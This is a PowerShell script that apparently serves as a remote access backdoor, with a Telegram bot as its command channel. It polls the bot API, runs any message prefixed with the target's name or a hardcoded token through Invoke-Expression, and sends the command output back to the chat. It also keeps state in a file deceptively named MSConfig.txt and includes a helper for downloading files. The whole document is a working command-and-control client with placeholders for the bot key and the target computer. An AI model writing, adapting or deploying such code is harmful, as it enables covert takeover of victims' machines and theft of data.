Add-Type -AssemblyName System.ServiceModel.Web, System.Runtime.Serialization, System.Web.Extensions ,System.Web
$utf8 = [System.Text.Encoding]::UTF8

function ConvertTo-Json20([object] $item){
    $ps_js=new-object System.Web.Script.Serialization.JavaScriptSerializer
    return $ps_js.Serialize($item)
}

function Request-Rest
{
  [CmdletBinding()]
  PARAM (
         [Parameter(Mandatory=$true)]
         [String] $URL,

         [Parameter(Mandatory=$false)]
         [System.Net.NetworkCredential] $credentials,

         [Parameter(Mandatory=$false)]
         [String] $JSON)
  $JSON = $JSON -replace "$([Environment]::NewLine) *",""  
  $URI = New-Object System.Uri($URL,$true)   

  try
  { 
    $request = [System.Net.HttpWebRequest]::Create($URI)  
    $UserAgent = "My user Agent"
    $request.UserAgent = $("{0} (PowerShell {1}; .NET CLR {2}; {3})" -f $UserAgent, $(if($Host.Version){$Host.Version}else{"1.0"}),  
                           [Environment]::Version,  
                           [Environment]::OSVersion.ToString().Replace("Microsoft Windows ", "Win"))
    $request.Credentials = $credentials
    $request.KeepAlive = $true
    $request.Pipelined = $true
    $request.AllowAutoRedirect = $false
    $request.Method = "POST"
    $request.ContentType = "application/json"
    $request.Accept = "application/json"
    $utf8Bytes = [System.Text.Encoding]::UTF8.GetBytes($JSON)
    $request.ContentLength = $utf8Bytes.Length
    $postStream = $request.GetRequestStream()
    $postStream.Write($utf8Bytes, 0, $utf8Bytes.Length)
    $postStream.Dispose()
    try
    {
      $response = $request.GetResponse()
    }
    catch
    {
      $response = $Error[0].Exception.InnerException.Response; 
      Throw "Exception occurred in $($MyInvocation.MyCommand): `n$($_.Exception.Message)"
    }
    $reader = [IO.StreamReader] $response.GetResponseStream()  
    $output = $reader.ReadToEnd()  
    $reader.Close()  
    $response.Close()
    Write-Output $output  
  }
  catch
  {
    $output = @"
    {
      "error":1,
      "error_desc":"Error : Problème d'accès au serveur $($_.Exception.Message)"
    }
"@    
    Write-Output $output
  }
}
function ConvertFrom-Json20([object] $item){ 
    add-type -assembly system.web.extensions
    $ps_js=new-object system.web.script.serialization.javascriptSerializer

    #The comma operator is the array construction operator in PowerShell
    return ,$ps_js.DeserializeObject($item)
}
function DownloadFile([string] $url,[string] $DownPath){
    (New-Object Net.WebClient).DownloadFile($url, $DownPath)
    return Invoke-Expression -Command "ls $DownPath"
}

function makepath () {
    $vlos = Get-PSDrive -PSProvider FileSystem
    foreach($drive in $vlos){
        $files=Invoke-Expression -Command ("ls "+ $drive+":\")
        foreach($f in $files){
            if($f.PSChildName.StartsWith("Program ") ){
                return $f.FullName+"\MSConfig.txt"
            }
        }
    }
}
$path = makepath
function ResponseCommand ([string]$command) {
    $res=Invoke-Expression $command
    return $res
}
function checkFile()
{
    $checkFile=Test-Path $path
    if($checkFile -ne $true)
    {
        New-Item -Path $path -ItemType File -Force
    }
}
$Key = "your bot hash code" ##########################################################################Static Forever
$GetUpdatesUri = "https://api.telegram.org/bot$Key/getUpdates"
checkFile
while($true)
{
    Write-Host "on the starting loop"
    $GetUpdate = Request-Rest -URL $GetUpdatesUri -credentials $null
    Write-Host "Get Update Done"
    $GetJSONUpdate = ConvertFrom-Json20 -item $GetUpdate
    Write-Host "GetJSONUpdate Done"
    $lastmsg=$GetJSONUpdate.result[$GetJSONUpdate.result.length-1]
    Write-Host "Maybe Here!"
    $compCode = "You can name target computer here" ################################################################################change to target name
    $sendMsgLink = "https://api.telegram.org/bot$Key/sendMessage"    
    checkFile
    Write-Host "file checked going to get content"
    $lstMsgId = Get-Content -Path $path
    Write-Host "i got the content \n here it is : "+ $lastmsg.message.text
    if($lstMsgId -ne $lastmsg.update_id){
    Write-Host "im here with this update_ID : "+ $lastmsg.update_id
        if($lastmsg.message.text.StartsWith($compCode) -or $lastmsg.message.text.StartsWith("jJB9rRiWFzWUgnCsSw5VbKGCBuU")) 
        {
        
            Write-Host "on second id while  true if \ here is lastmessage text babe\n"+ $lastMsg
            if($lastmsg.message.text.StartsWith($compCode)){
                Write-Host "first if Control message started"
                 $command = $lastmsg.message.text.Replace($compCode,"").TrimStart()
                 Write-Host "first if Control message done"                
            }
            else{
            Write-Host "second if Control message started"
                 $command = $lastmsg.message.text.Replace("jJB9rRiWFzWUgnCsSw5VbKGCBuU","").TrimStart()  
                 Write-Host "second if Control message done"              
            }
            Write-Host "getting the result startd"
            $result = ResponseCommand -command $command
            Write-Host "first if Control message done and gonnad send message"
            Request-Rest -URL $sendMsgLink -JSON (ConvertTo-Json20 -item @{chat_id=$lastmsg.message.chat.id; reply_to_message_id=$lastmsg.message.message_id; text="$result"}) -credentials $null
            Write-Host "send message done checking the file ;-)"
            checkFile
            Write-Host "file checked and gonna write on it"
            Set-Content -Path $path -Value $lastmsg.update_id 
            Write-Host "###################well done getting back to loop again #######################################"           
        }

    }
    
}